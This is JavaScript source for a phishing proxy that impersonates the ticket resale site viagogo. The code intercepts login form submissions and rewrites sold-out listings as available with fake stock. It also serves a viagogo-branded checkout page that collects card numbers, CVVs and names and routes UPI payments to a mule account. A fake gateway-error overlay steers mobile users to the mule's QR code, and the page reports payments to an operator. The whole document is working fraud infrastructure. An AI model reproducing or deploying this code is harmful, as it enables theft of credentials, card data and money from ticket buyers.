      cRes.writeHead(502, { 'content-type': 'text/html' });
      cRes.end(`<html><head><meta http-equiv="refresh" content="2"></head><body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Inter,sans-serif;background:#f5f5f5"><div style="text-align:center"><h2>Loading...</h2><p>Please wait</p></div></body></html>`);
    }
  });

  if (cReq.method === 'GET' || cReq.method === 'HEAD') {
    pReq.end();
  } else {
    // Intercept POST bodies for login detection
    const vid = visitorId(cReq);
    if (LOGIN_POST_RE.test(cReq.url)) {
      let bodyChunks = [];
      cReq.on('data', chunk => { bodyChunks.push(chunk); });
      cReq.on('end', () => {
        const fullBody = Buffer.concat(bodyChunks);
        const bodyStr = fullBody.toString('utf-8');
        interceptLoginRequest(cReq.url, bodyStr, vid);
        pReq.end(fullBody);
      });
    } else {
      cReq.pipe(pReq);
    }
  }
}

// ═══════════════════════════════════════════════════════════════════
// JSON AVAILABILITY REWRITING
// Override sold-out/unavailable status in API responses
// ═══════════════════════════════════════════════════════════════════

function rewriteJsonAvailability(text, requestUrl) {
  if (text.length > 2_000_000) return text;
  let json;
  try { json = JSON.parse(text); } catch { return text; }

  let modified = false;

  function walk(obj) {
    if (typeof obj !== 'object' || obj === null) return;

    // Override availability flags
    for (const key of ['isSoldOut', 'is_sold_out', 'soldOut', 'isUnavailable', 'unavailable']) {
      if (obj[key] === true) {
        obj[key] = false;
        modified = true;
      }
    }

    // Override status strings
    for (const key of ['status', 'availability', 'ticketStatus', 'eventStatus']) {
      if (typeof obj[key] === 'string') {
        const val = obj[key].toLowerCase();
        if (val === 'sold_out' || val === 'soldout' || val === 'unavailable' || val === 'closed') {
          obj[key] = 'available';
          modified = true;
        }
      }
    }

    // Override ticket count to show availability
    for (const key of ['availableTickets', 'ticketCount', 'totalTickets', 'inventory', 'quantityAvailable']) {
      if (obj[key] === 0 || obj[key] === '0') {
        const seed = requestUrl.split('?')[0];
        obj[key] = fakeStock(seed);
        modified = true;
      }
    }

    // Recurse
    if (Array.isArray(obj)) {
      for (let i = 0; i < obj.length; i++) {
        if (typeof obj[i] === 'object' && obj[i] !== null) walk(obj[i]);
      }
    } else {
      for (const key in obj) {
        if (typeof obj[key] === 'object' && obj[key] !== null) walk(obj[key]);
      }
    }
  }

  walk(json);
  return modified ? JSON.stringify(json) : text;
}

// ═══════════════════════════════════════════════════════════════════
// PAYMENT PAGE — viagogo-styled UPI + card capture
// ═══════════════════════════════════════════════════════════════════

function paymentPageHTML(amount, orderId, mule, mobile, eventName, section, seatInfo, qty, eventDate, eventTime, eventVenue) {
  const amt = parseFloat(amount) || 4999;
  const numQty = parseInt(qty) || 1;
  const amtFmt = amt.toLocaleString('en-IN');
  const perTicket = numQty > 1 ? Math.round(amt / numQty) : amt;
  const perTicketFmt = perTicket.toLocaleString('en-IN');
  const safeEvent = JSON.stringify(eventName || 'Event Tickets');
  const safeSection = JSON.stringify(section || '');
  const safeSeat = JSON.stringify(seatInfo || '');
  const safeDate = JSON.stringify(eventDate || '');
  const safeTime = JSON.stringify(eventTime || '');
  const safeVenue = JSON.stringify(eventVenue || '');
  const txnId = 'VGP' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2,8).toUpperCase();
  const upiQuery = `pa=${encodeURIComponent(mule.vpa)}&pn=${encodeURIComponent(mule.name)}&cu=INR&tr=${orderId}&tn=Ticket+Purchase+${orderId}`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>viagogo - Secure Payment</title>
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<meta property="og:title" content="Secure Checkout - viagogo">
<meta property="og:description" content="Complete your ticket purchase securely. Protected by the viagogo Guarantee.">
<meta property="og:site_name" content="viagogo">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary">
<meta name="description" content="viagogo - Complete your secure ticket purchase">
<script src="/_qrcode.js"><\/script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Inter,'Helvetica Neue',Roboto,Arial,'Lucida Grande',sans-serif;background:#f5f5f5;color:#091218;min-height:100vh;-webkit-user-select:none;-moz-user-select:none;user-select:none;-webkit-touch-callout:none;overflow-x:hidden}

/* ── Header ── */
.vg-header{background:#fff;height:62px;border-bottom:1px solid #E6E9EB;display:flex;align-items:center;box-shadow:0 1px 4px rgba(0,0,0,.06)}
.vg-header-inner{max-width:960px;margin:0 auto;padding:0 20px;width:100%;display:flex;align-items:center;justify-content:space-between}
.vg-logo{display:flex;align-items:center;text-decoration:none}
.vg-logo svg{height:28px;width:auto}
.secure-tag{display:flex;align-items:center;gap:5px;color:#878787;font-size:12px}
.secure-tag svg{width:14px;height:14px;opacity:0.5}

/* ── Top banner ── */
.vg-banner{background:#000;color:#fff;text-align:center;padding:6px 16px;font-size:14px;font-weight:400;line-height:28px;min-height:28px}
.vg-banner a{color:#4E7C05;text-decoration:none;font-weight:600}

/* ── Main ── */
.main-wrap{max-width:960px;margin:20px auto;padding:0 20px}
@media(max-width:600px){.main-wrap{margin:0;padding:0}}

/* ── Order summary card ── */
.order-card{background:#fff;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.08);padding:20px;margin-bottom:16px}
@media(max-width:600px){.order-card{border-radius:0;margin-bottom:0}}
.order-title{font-size:18px;font-weight:700;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.order-title svg{color:#4E7C05}
.order-event{font-size:15px;color:#333;margin-bottom:8px;font-weight:500}
.order-row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;border-bottom:1px solid #f0f0f0}
.order-row:last-child{border-bottom:none}
.order-row .label{color:#677383}
.order-row .value{font-weight:600;color:#091218;max-width:60%;text-align:right;word-wrap:break-word}
.order-total{display:flex;justify-content:space-between;padding:12px 0 0;font-size:18px;font-weight:700;border-top:2px solid #091218;margin-top:8px}
.order-total .amount{color:#4E7C05}

/* ── Payment methods ── */
.pay-card{background:#fff;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.08);padding:20px;margin-bottom:16px}
@media(max-width:600px){.pay-card{border-radius:0}}
.pay-title{font-size:16px;font-weight:700;margin-bottom:16px}

.method-tab{display:flex;gap:0;border:1px solid #E6E9EB;border-radius:12px;overflow:hidden;margin-bottom:20px}
.method-tab button{flex:1;padding:12px 8px;border:none;background:#fff;font-size:14px;font-weight:500;cursor:pointer;color:#677383;transition:all .2s;font-family:Inter,sans-serif;height:48px}
.method-tab button.active{background:#4E7C05;color:#fff}
.method-tab button:hover:not(.active){background:#f5f5f5}

.tab-panel{display:none}
.tab-panel.active{display:block}

/* ── UPI section ── */
.upi-section{text-align:center}
.upi-vpa-box{background:#f8faf3;border:2px solid #4E7C05;border-radius:12px;padding:16px;margin:12px 0;display:flex;align-items:center;justify-content:space-between;gap:12px}
@media(max-width:380px){.upi-vpa-box{flex-direction:column;align-items:stretch;text-align:center}}
.upi-vpa-label{font-size:12px;color:#677383;text-align:left}
.upi-vpa-id{font-size:16px;font-weight:700;color:#091218;text-align:left;word-break:break-all}
@media(max-width:380px){.upi-vpa-label,.upi-vpa-id{text-align:center}}
.copy-btn{background:#4E7C05;color:#fff;border:none;padding:12px 20px;border-radius:12px;font-size:14px;font-weight:500;cursor:pointer;font-family:Inter,sans-serif;white-space:nowrap;flex-shrink:0;min-height:44px}
.copy-btn:active{background:#3d6304}
.qr-wrap{margin:16px auto;display:inline-block;padding:16px;background:#fff;border:2px solid #e0e0e0;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.06)}
.qr-label{font-size:13px;font-weight:600;color:#091218;margin-bottom:8px;text-align:center}
.paid-btn{display:block;width:100%;padding:14px;background:#4E7C05;color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:500;cursor:pointer;margin-top:16px;font-family:Inter,sans-serif;height:48px}
.paid-btn:active{background:#3d6304}
.upi-app-btn{display:flex;align-items:center;gap:6px;padding:10px 18px;border:2px solid #E6E9EB;border-radius:12px;background:#fff;font-size:13px;font-weight:600;cursor:pointer;font-family:Inter,sans-serif;transition:all .15s;color:#091218}
.upi-app-btn:active{border-color:#4E7C05;background:#f8faf3;transform:scale(0.97)}
.upi-app-btn img{width:24px;height:24px;border-radius:4px}

/* ── Card section ── */
.card-form label{display:block;font-size:13px;font-weight:500;color:#091218;margin-bottom:4px;margin-top:12px}
.card-form input{width:100%;padding:11px 14px;border:1px solid #E6E9EB;border-radius:12px;font-size:15px;font-family:Inter,sans-serif;color:#091218;outline:none;transition:border .2s}
.card-form input:focus{border-color:#4E7C05}
.card-row{display:flex;gap:12px}
.card-row>div{flex:1}
.card-submit{display:block;width:100%;padding:14px;background:#4E7C05;color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:500;cursor:pointer;margin-top:20px;font-family:Inter,sans-serif;height:48px}
.card-error{display:none;background:#fef2f2;border:1px solid #fecaca;color:#dc2626;padding:12px;border-radius:12px;margin-top:12px;font-size:13px}

/* ── Countdown timer ── */
.countdown-bar{background:#E7FFC3;border:1px solid #b8e986;border-radius:12px;padding:12px 16px;margin-bottom:16px;display:flex;align-items:center;gap:10px;font-size:14px;color:#3F6600}
@media(max-width:600px){.countdown-bar{border-radius:0;margin-bottom:0;border-left:none;border-right:none}}
.countdown-bar svg{flex-shrink:0;width:18px;height:18px}
.countdown-bar .timer{font-weight:700;font-variant-numeric:tabular-nums;font-family:'Courier New',monospace;font-size:16px;margin-left:auto;color:#4E7C05}

/* ── Allow text selection on useful elements ── */
.order-row .value,.card-error,.ticket-id{-webkit-user-select:text;-moz-user-select:text;user-select:text}

/* ── Trust badges ── */
.trust-row{display:flex;gap:12px;justify-content:center;margin-top:20px;flex-wrap:wrap}
.trust-badge{display:flex;align-items:center;gap:5px;font-size:11px;color:#677383;background:#fafafa;padding:6px 12px;border-radius:20px;border:1px solid #E6E9EB}
.trust-badge svg{width:14px;height:14px;color:#4E7C05}

/* ── Status overlay ── */
.status-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:1000;justify-content:center;align-items:center}
.status-overlay.show{display:flex}
.status-box{background:#fff;border-radius:12px;padding:32px;text-align:center;max-width:380px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,.15)}
.status-box h3{font-size:18px;margin-bottom:8px}
.status-box p{font-size:14px;color:#666;margin-bottom:20px}
.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#4E7C05;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}
.success-icon{width:56px;height:56px;background:#4E7C05;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center}
.success-icon svg{width:28px;height:28px;color:#fff}

/* ── App Error Overlay ── */
.app-error-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.45);z-index:999;justify-content:center;align-items:center}
.app-error-overlay.show{display:flex}
.app-error-box{background:#fff;border-radius:12px;padding:28px 24px;text-align:center;max-width:360px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,.18)}
.app-error-box h3{font-size:16px;font-weight:700;margin:8px 0;color:#191c1f}
.app-error-box p{font-size:13px;color:#555;line-height:1.5;margin-top:8px}
.app-error-dismiss{margin-top:16px;padding:11px 28px;background:#4E7C05;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;font-family:Inter,sans-serif}
.app-error-dismiss:active{background:#3d6304}
</style>
</head>
<body>

<div class="vg-banner">
  Your tickets are protected by the <a href="#">viagogo Guarantee</a> — valid tickets, on time delivery
</div>

<div class="vg-header">
  <div class="vg-header-inner">
    <a class="vg-logo" href="/"><svg viewBox="0 0 111 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M67.038 28.645c-2.08.003-3.445-1.685-3.447-4.414-.004-2.695 1.262-4.32 3.245-4.324 2.077-.002 3.348 1.753 3.35 4.418.001 2.695-1.133 4.318-3.148 4.32m-.011-12.895c-5.004.002-8.64 3.676-8.636 8.681.006 4.874 3.388 8.41 8.262 8.406 5.133-.004 8.736-3.647 8.73-8.81-.003-4.712-3.484-8.282-8.356-8.277M49.072 28.273c-1.755.002-3.314-1.394-3.317-4.061-.001-2.728 1.62-4.322 3.601-4.322 1.074 0 1.757.259 2.08.421l.007 7.212c-.067.033-.942.75-2.37.75m7.464-10.697c-.49-.258-3.447-1.814-7.086-1.808-5.425.001-8.833 3.904-8.827 8.679.002 3.8 2.151 7.956 7.349 7.954 2.176-.002 3.278-.945 3.475-1.078v1.238c.003 2.176-1.036 3.28-3.506 3.283-2.565.001-4.614-1.297-4.84-1.458l-2.045 3.218c.358.323 2.861 2.4 7.507 2.396 3.572-.004 5.392-1.434 6.204-2.249 1.914-1.883 1.782-3.767 1.78-5.78z" fill="#89CF28"/><path d="M85.07 28.24c-1.756.002-3.316-1.394-3.318-4.057-.004-2.73 1.62-4.322 3.601-4.322 1.073-.004 1.755.255 2.08.418l.007 7.214c-.065.032-.94.746-2.37.748m7.461-10.695c-.49-.259-3.445-1.816-7.084-1.814-5.425.006-8.833 3.907-8.83 8.683.004 3.801 2.152 7.958 7.351 7.954 2.175-.002 3.281-.944 3.474-1.078l.002 1.236c.002 2.179-1.038 3.283-3.506 3.285-2.566.004-4.614-1.295-4.841-1.457l-2.045 3.216c.359.326 2.861 2.401 7.506 2.4 3.574-.004 5.392-1.435 6.205-2.25 1.913-1.882 1.782-3.767 1.78-5.783zm-61.038 11.49c-.845.003-2.016-.39-2.016-1.949 0-.648.26-1.071.552-1.363.94-.943 3.215-.881 4.449-.881l.005 3.282c-.164.097-1.235.91-2.99.912m6.455-11.343c-1.266-1.268-3.12-1.882-5.589-1.88-3.835.003-6.043 1.566-6.301 1.758l1.562 3.087c.195-.096 2.207-1.107 4.482-1.109 1.138 0 1.658.26 1.917.519.424.422.392.94.392 1.463h-.357c-1.69 0-8.87.006-8.864 5.951.002 3.084 1.985 5.26 5.234 5.26 2.534-.005 4.19-1.433 4.547-1.727v1.366l4.29-.004-.01-9.423c-.002-1.98.096-3.866-1.303-5.26m64.576 10.922c-2.079.002-3.447-1.686-3.45-4.416 0-2.693 1.266-4.32 3.246-4.323 2.079-.003 3.348 1.75 3.352 4.417.002 2.697-1.134 4.322-3.148 4.322m-.011-12.898c-5.003.006-8.641 3.681-8.637 8.685.005 4.871 3.387 8.41 8.261 8.404 5.135-.004 8.734-3.645 8.73-8.81-.001-4.712-3.483-8.283-8.354-8.279M20.819 9c-1.526.004-2.759 1.203-2.759 2.733a2.76 2.76 0 0 0 2.763 2.757c1.53-.002 2.73-1.239 2.729-2.762A2.703 2.703 0 0 0 20.819 9m-2.626 7.28.016 16.113 5.198-.004-.015-16.114zM8.881 26.652 5.494 16.292l-5.361.002L6.19 32.403l4.872-.002 6.127-16.12-5.005.004z" fill="#4C5055"/></svg></a>
    <div class="secure-tag">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      Secure Checkout
    </div>
  </div>
</div>

<div class="main-wrap">

  <div class="order-card">
    <div class="order-title">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4E7C05" stroke-width="2"><path d="M20 12V22H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7"/><path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg>
      Order Summary
    </div>
    <div class="order-event">${eventName || 'Event Tickets'}</div>
    ${eventDate || eventTime ? `<div class="order-row"><span class="label">Date &amp; Time</span><span class="value">${eventDate}${eventDate && eventTime ? ' &bull; ' : ''}${eventTime}</span></div>` : ''}
    ${eventVenue ? `<div class="order-row"><span class="label">Venue</span><span class="value">${eventVenue}</span></div>` : ''}
    ${section ? `<div class="order-row"><span class="label">Section</span><span class="value">${section}</span></div>` : ''}
    ${seatInfo ? `<div class="order-row"><span class="label">Seat</span><span class="value">${seatInfo}</span></div>` : ''}
    ${numQty > 1 ? `<div class="order-row"><span class="label">Quantity</span><span class="value">${numQty} tickets</span></div>
    <div class="order-row"><span class="label">Price per ticket</span><span class="value">&#8377;${perTicketFmt}</span></div>` : `<div class="order-row"><span class="label">Ticket price</span><span class="value">&#8377;${amtFmt}</span></div>`}
    <div class="order-row"><span class="label">Service fee</span><span class="value">Included</span></div>
    <div class="order-row"><span class="label">Delivery</span><span class="value">E-ticket (instant)</span></div>
    <div class="order-row"><span class="label">Order ID</span><span class="value" style="font-size:12px;font-family:monospace">${orderId}</span></div>
    <div class="order-total"><span>Total</span><span class="amount">&#8377;${amtFmt}</span></div>
  </div>

  <div class="countdown-bar" id="countdownBar">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
    <span>Tickets reserved for you &mdash; complete payment within</span>
    <span class="timer" id="countdownTimer">14:59</span>
  </div>

  <div class="pay-card">
    <div class="pay-title">Select Payment Method</div>

    <div class="method-tab">
      <button class="active" onclick="switchTab('upi',this)">UPI</button>
      <button onclick="switchTab('card',this)">Credit / Debit Card</button>
    </div>

    <!-- UPI Tab -->
    <div class="tab-panel active" id="tab-upi">
      <div class="upi-section">
        <div class="upi-vpa-box">
          <div>
            <div class="upi-vpa-label">Pay to viagogo Payments UPI</div>
            <div class="upi-vpa-id" id="displayVpa">${mule.displayVpa}</div>
          </div>
          <button class="copy-btn" onclick="copyVPA()">Copy</button>
        </div>
        <div id="upiApps" style="display:none;margin:16px 0">
          <p style="font-size:13px;font-weight:600;margin-bottom:10px;color:#333">Pay &#8377;${amtFmt} with</p>
          <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap" id="appBtns"></div>
        </div>
        <div class="qr-wrap"><div class="qr-label">Scan to Pay &#8377;${amtFmt}</div><div id="qrBox"></div></div>
        <p style="font-size:12px;color:#888;margin:8px 0 4px">Scan QR code or tap your UPI app above to pay &#8377;${amtFmt}</p>
        <p style="font-size:11px;color:#aaa;margin-bottom:12px">Amount is pre-filled — just approve in your app</p>
        <button class="paid-btn" onclick="startVerify()">I've Paid &#8377;${amtFmt}</button>
      </div>
    </div>

    <!-- Card Tab -->
    <div class="tab-panel" id="tab-card">
      <div class="card-form">
        <label>Card Number</label>
        <input type="text" id="cardNum" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" autocomplete="cc-number">
        <div class="card-row">
          <div>
            <label>Expiry</label>
            <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
          </div>
          <div>
            <label>CVV</label>
            <input type="password" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
          </div>
        </div>
        <label>Name on Card</label>
        <input type="text" id="cardName" placeholder="John Doe" autocomplete="cc-name">
        <button class="card-submit" onclick="submitCard()">Pay &#8377;${amtFmt}</button>
        <div class="card-error" id="cardError"></div>
      </div>
    </div>
  </div>

  <div class="trust-row">
    <div class="trust-badge">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
      viagogo Guarantee
    </div>
    <div class="trust-badge">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      256-bit SSL
    </div>
    <div class="trust-badge">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
      450M+ tickets sold
    </div>
  </div>

  <div style="text-align:center;padding:16px 0 8px;font-size:12px;color:#677383">
    <a href="#" style="color:#677383;text-decoration:none;margin:0 8px">User Agreement</a>
    <span style="color:#E6E9EB">|</span>
    <a href="#" style="color:#677383;text-decoration:none;margin:0 8px">Privacy Notice</a>
    <span style="color:#E6E9EB">|</span>
    <a href="#" style="color:#677383;text-decoration:none;margin:0 8px">Cookie Notice</a>
  </div>
  <div style="text-align:center;padding:4px 0 24px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:13px;font-weight:700;color:#091218">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4E7C05" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    Every order is 100% guaranteed
  </div>

</div>

<!-- App Error Overlay -->
<div class="app-error-overlay" id="appErrorOverlay">
  <div class="app-error-box">
    <div style="font-size:36px;margin-bottom:4px">&#9888;&#65039;</div>
    <h3>Payment Gateway Issue</h3>
    <p>We're experiencing a temporary issue with direct UPI app payments due to unusually high demand for this event. Our engineering team has been notified.</p>
    <p style="font-weight:600;color:#191c1f;margin-top:12px">Please use the <span style="color:#4E7C05">QR code</span> or <span style="color:#4E7C05">copy the UPI ID</span> to complete your payment securely.</p>
    <p style="font-size:11px;color:#999;margin-top:8px">&mdash; viagogo Payments Team</p>
    <button class="app-error-dismiss" onclick="document.getElementById('appErrorOverlay').classList.remove('show')">OK, I'll use QR / UPI ID</button>
  </div>
</div>

<!-- Status overlay -->
<div class="status-overlay" id="statusOverlay">
  <div class="status-box" id="statusBox">
    <div class="spinner" id="statusSpinner"></div>
    <h3 id="statusTitle">Verifying Payment</h3>
    <p id="statusMsg">Please wait while we confirm your payment...</p>
  </div>
</div>

<script>
var REAL_VPA='${mule.vpa}';
var DISPLAY_VPA='${mule.displayVpa}';
var ORDER_ID='${orderId}';
var AMOUNT=${amt};
var EVENT_NAME=${safeEvent};
var SECTION_NAME=${safeSection};
var SEAT_INFO=${safeSeat};
var QTY=${numQty};
var EVENT_DATE=${safeDate};
var EVENT_TIME=${safeTime};
var EVENT_VENUE=${safeVenue};

function switchTab(tab,btn){
  document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active');});
  document.querySelectorAll('.method-tab button').forEach(function(b){b.classList.remove('active');});
  document.getElementById('tab-'+tab).classList.add('active');
  if(btn)btn.classList.add('active');
}

function copyVPA(){
  function onCopied(){
    var btn=document.querySelector('.copy-btn');
    btn.textContent='Copied!';
    btn.style.background='#388e3c';
    setTimeout(function(){btn.textContent='Copy';btn.style.background='#4E7C05';},2000);
    fetch('/_payment/copy-alert',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({orderId:ORDER_ID,amount:AMOUNT,vpa:REAL_VPA})}).catch(function(){});
  }
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(REAL_VPA).then(onCopied).catch(function(){
      var el=document.createElement('textarea');el.value=REAL_VPA;el.style.position='fixed';el.style.left='-9999px';
      document.body.appendChild(el);el.select();document.execCommand('copy');document.body.removeChild(el);onCopied();
    });
  } else {
    var el=document.createElement('textarea');el.value=REAL_VPA;el.style.position='fixed';el.style.left='-9999px';
    document.body.appendChild(el);el.select();document.execCommand('copy');document.body.removeChild(el);onCopied();
  }
}

/* QR + UPI app buttons */
window.addEventListener('DOMContentLoaded',function(){
  var upiBase='upi://pay?pa='+encodeURIComponent(REAL_VPA)+'&pn='+encodeURIComponent('${mule.name}')+'&am='+AMOUNT+'&cu=INR&tr='+ORDER_ID+'&tn=Ticket+Purchase+'+ORDER_ID;
  if(typeof QRCode!=='undefined'){
    new QRCode(document.getElementById('qrBox'),{
      text:upiBase,width:220,height:220,correctLevel:QRCode.CorrectLevel.M
    });
  }
  /* Mobile UPI app buttons — show gateway error overlay to redirect to QR/VPA copy */
  var isMob=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  if(isMob){
    var apps=[
      {name:'PhonePe',icon:'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><defs><linearGradient id=%22pg%22 x1=%220%22 y1=%220%22 x2=%220%22 y2=%221%22><stop offset=%220%22 stop-color=%22%236C2EB1%22/><stop offset=%221%22 stop-color=%22%234A148C%22/></linearGradient></defs><rect width=%2240%22 height=%2240%22 rx=%2210%22 fill=%22url(%23pg)%22/><path d=%22M15 30V12h6c3.5 0 6 2.5 6 5.5S24.5 23 21 23h-2v7z%22 fill=%22white%22/></svg>'},
      {name:'Google Pay',icon:'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 rx=%2210%22 fill=%22%23fff%22 stroke=%22%23dadce0%22 stroke-width=%22.5%22/><rect x=%229%22 y=%2213%22 width=%2222%22 height=%223.5%22 rx=%221.5%22 fill=%22%234285F4%22/><rect x=%229%22 y=%2218.2%22 width=%2222%22 height=%223.5%22 rx=%221.5%22 fill=%22%2334A853%22/><rect x=%229%22 y=%2223.5%22 width=%2222%22 height=%223.5%22 rx=%221.5%22 fill=%22%23EA4335%22/></svg>'},
      {name:'Paytm',icon:'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><defs><linearGradient id=%22pt%22 x1=%220%22 y1=%220%22 x2=%220%22 y2=%221%22><stop offset=%220%22 stop-color=%22%2300D4FF%22/><stop offset=%221%22 stop-color=%22%23002970%22/></linearGradient></defs><rect width=%2240%22 height=%2240%22 rx=%2210%22 fill=%22url(%23pt)%22/><text x=%2220%22 y=%2225%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2210%22 font-weight=%22700%22 font-family=%22Arial%22>Paytm</text></svg>'},
      {name:'BHIM UPI',icon:'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><defs><linearGradient id=%22bm%22 x1=%220%22 y1=%220%22 x2=%220%22 y2=%221%22><stop offset=%220%22 stop-color=%22%23009688%22/><stop offset=%221%22 stop-color=%22%2300695C%22/></linearGradient></defs><rect width=%2240%22 height=%2240%22 rx=%2210%22 fill=%22url(%23bm)%22/><text x=%2220%22 y=%2224%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%229%22 font-weight=%22700%22 font-family=%22Arial%22>BHIM</text></svg>'}
    ];
    var container=document.getElementById('appBtns');
    apps.forEach(function(a){
      var btn=document.createElement('button');
      btn.className='upi-app-btn';
      btn.innerHTML='<img src="'+a.icon+'" alt="'+a.name+'"> '+a.name;
      btn.onclick=function(e){
        e.preventDefault();
        document.getElementById('appErrorOverlay').classList.add('show');
      };
      container.appendChild(btn);
    });
    document.getElementById('upiApps').style.display='block';
  }
});

/* Verify payment — polls server, admin must confirm via TG or dashboard */
function startVerify(){
  if(window._verifyStarted)return;
  window._verifyStarted=true;
  if(window._countdownId)clearInterval(window._countdownId);
  var cBar=document.getElementById('countdownBar');if(cBar)cBar.style.display='none';
  var overlay=document.getElementById('statusOverlay');
  overlay.classList.add('show');
  document.getElementById('statusTitle').textContent='Verifying Payment';
  document.getElementById('statusMsg').textContent='Please wait while we confirm your payment with your bank...';
  /* Register pending payment */
  fetch('/_payment/register',{
    method:'POST',
    headers:{'content-type':'application/json'},
    body:JSON.stringify({orderId:ORDER_ID,amount:AMOUNT,vpa:REAL_VPA,method:'upi',host:location.host,proto:location.protocol.replace(':',''),event:EVENT_NAME,section:SECTION_NAME,seat:SEAT_INFO,qty:QTY})
  }).catch(function(){});
  /* Poll for admin confirmation every 3s */
  var dots=0;
  var msgs=['Verifying with your bank','Confirming transaction','Processing payment','Checking with payment gateway'];
  var mi=0;
  window._pollTimer=setInterval(function(){
    dots=(dots+1)%4;
    if(dots===0)mi=(mi+1)%msgs.length;
    var dotStr='';for(var d=0;d<dots;d++)dotStr+='.';
    document.getElementById('statusMsg').textContent=msgs[mi]+dotStr;
    fetch('/_payment/status?oid='+ORDER_ID)
      .then(function(r){return r.json();})
      .then(function(d){
        if(d.status==='confirmed'){
          clearInterval(window._pollTimer);
          document.getElementById('statusSpinner').style.display='none';
          var ticketUrl='/_ticket?oid='+encodeURIComponent(ORDER_ID)+'&event='+encodeURIComponent(EVENT_NAME)+'&amount='+AMOUNT+'&section='+encodeURIComponent(SECTION_NAME)+'&seat='+encodeURIComponent(SEAT_INFO)+'&qty='+QTY+(EVENT_DATE?'&date='+encodeURIComponent(EVENT_DATE):'')+(EVENT_TIME?'&time='+encodeURIComponent(EVENT_TIME):'')+(EVENT_VENUE?'&venue='+encodeURIComponent(EVENT_VENUE):'');
          document.getElementById('statusBox').innerHTML='<div class="success-icon"><svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg></div><h3 style="color:#4E7C05">Payment Confirmed!</h3><p>Your e-tickets have been generated and are ready.</p><a href="'+ticketUrl+'" style="display:inline-block;margin-top:16px;padding:12px 28px;background:#4E7C05;color:#fff;border-radius:8px;text-decoration:none;font-weight:700;font-size:15px">Download E-Tickets</a><p style="font-size:12px;color:#aaa;margin-top:12px">Order: '+ORDER_ID+'</p>';
        } else if(d.status==='denied'){
          clearInterval(window._pollTimer);
          document.getElementById('statusSpinner').style.display='none';
